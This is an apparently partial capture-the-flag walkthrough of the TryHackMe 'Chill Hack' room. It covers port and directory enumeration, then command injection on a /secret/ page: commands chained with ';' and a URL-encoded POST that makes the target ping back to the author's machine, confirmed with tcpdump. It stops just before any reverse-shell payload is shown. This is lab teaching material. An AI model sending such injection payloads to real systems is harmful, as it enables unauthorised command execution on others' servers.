# Chill Hack

![image](https://user-images.githubusercontent.com/5285547/127403967-7b72f2d6-60aa-4f74-8f0d-f8bbce81071c.png)

Room link: https://tryhackme.com/room/chillhack


A quick enum to get started, I usually run as a basic, nmap, nikto, gobuster as a min.

## Nmap 

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## Gobuster

```
/css                  (Status: 301) [Size: 310] [--> http://10.10.44.162/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.44.162/images/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.44.162/fonts/] 
/secret               (Status: 301) [Size: 313] [--> http://10.10.44.162/secret/]             #  Seem's intresting! 
/js                   (Status: 301) [Size: 309] [--> http://10.10.44.162/js/] 
```

## http://10.10.44.162/secret/
*replace your IP for the rooms IP

This page gives us a box with command execution (Easy!)  

![image](https://user-images.githubusercontent.com/5285547/127404324-dcb6a694-b7cc-4037-8b6c-7f8b56acf541.png)

Trying other things like "ls" gives you...  

![image](https://user-images.githubusercontent.com/5285547/127404273-9aaf970c-0d55-48db-8908-1f152db4b0e9.png)


Testing some more I quickly realise we can chain together commands using ";"
ie:
```
id;ls
```

![image](https://user-images.githubusercontent.com/5285547/127404437-9126f1a0-0442-47a4-8a65-5b2038ddea97.png)

I captured the request in burp suite and then tried a few payloads to get a revershell back. 
First I checked with a simple ping command for a result to prove the connection back. 

Kali
```
sudo tcpdump -i tun0 icmp 
```

Post request

```
POST /secret/ HTTP/1.1
Host: 10.10.44.162
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.44.162
Connection: close
Referer: http://10.10.44.162/secret/
Upgrade-Insecure-Requests: 1

command=id%3bping%20-c%201%2010.8.153.120
```

Bingo! A reply!
```
┌──(ac1d㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                          
[sudo] password for ac1d: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:35:26.127709 IP 10.10.44.162 > 10.8.153.120: ICMP echo request, id 1871, seq 1, length 64
23:35:26.127742 IP 10.8.153.120 > 10.10.44.162: ICMP echo reply, id 1871, seq 1, length 64
```

Now I test payloads to see what pings back. 



